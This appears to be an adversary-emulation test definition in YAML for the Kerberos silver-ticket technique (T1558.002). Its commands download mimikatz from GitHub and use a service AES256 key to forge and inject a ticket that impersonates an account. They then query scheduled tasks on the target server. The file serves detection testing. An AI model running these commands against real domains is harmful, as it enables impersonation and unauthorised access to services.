@@ -1,0 +1,104 @@
+attack_technique: T1558.002
+display_name: 'Steal or Forge Kerberos Tickets: Silver Ticket'
+atomic_tests:
+- name: Crafting Active Directory silver tickets with mimikatz
+  auto_generated_guid: 385e59aa-113e-4711-84d9-f637aef01f2c
+  description: |
+    Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.
+    The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
+  supported_platforms:
+    - windows
+  input_arguments:
+    domain_sid:
+      description: SID of the targeted domain, if you keep default it will automatically get the current domain SID
+      type: String
+      default: S-1-5-21-DEFAULT
+    domain:
+      description: Targeted Active Directory domain FQDN
+      type: String
+      default: '%userdnsdomain%'
+    account:
+      description: Account to impersonate
+      type: String
+      default: silverticketfakeuser
+    target:
+      description: System you want to target (Default will be logon server)
+      type: String
+      default: '%logonserver:\\=%'
+    service_aes256_key:
+      description: AES256 key (you will need to set to match your service key for your target)
+      type: String
+      default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
+    mimikatz_path:
+      description: Mimikatz windows executable
+      type: Path
+      default: '$env:TEMP\mimikatz\x64\mimikatz.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
+    prereq_command: |
+      $mimikatz_path = cmd /c echo #{mimikatz_path}
+      if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $mimikatz_path = cmd /c echo #{mimikatz_path}
+      $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+      Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
+      Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+      New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+      Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
+      Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore
+
+      # get current domain SID if default was used
+      $domain_sid = "#{domain_sid}"
+      If ($domain_sid -Match "DEFAULT") {
+        # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
+        $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
+        $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
+        $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
+      }
+
+      # create batch file with commands to run in a separate "runas /netonly" session
+      # so we don't purge Kerberos ticket from the current Windows session
+      # its output goes to silver.txt temp file, because we cannot capture "runas /netonly" output otherwise
+      @"
+      >%TEMP%\silver.txt 2>&1 (
+        echo Purge existing tickets and create silver ticket:
+        klist purge
+        #{mimikatz_path} "kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{service_aes256_key} /user:#{account} /service:HOST /target:#{target}.#{domain} /ptt" "exit"
+
+        echo.
+        echo executing:schtasks /query /S #{target}.#{domain}
+        schtasks /query /S #{target}.#{domain}
+        
+        echo.
+        echo Tickets after requesting schtasks:
+        klist
+
+        echo.
+        echo End of Silver Ticket attack
+      )
+      "@ -Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat
+      
+      # run batch file in a new empty session (password and username do not matter)
+      echo "foo" | runas /netonly /user:fake "$env:TEMP\silver.bat" | Out-Null
+      
+      # wait until the output file has logged the entire attack
+      do {
+        Start-Sleep 1 # wait a bit so the output file has time to be created
+        Get-Content -Path "$env:TEMP\silver.txt" -Wait | ForEach-Object {
+          if ($_ -match 'End of Silver Ticket attack') { break } 
+        }
+      } while ($false) # dummy loop so that 'break' can be used
+
+      # show output from new empty session
+      Get-Content $env:TEMP\silver.txt
+
+      # cleanup temp files
+      Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
+      Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore
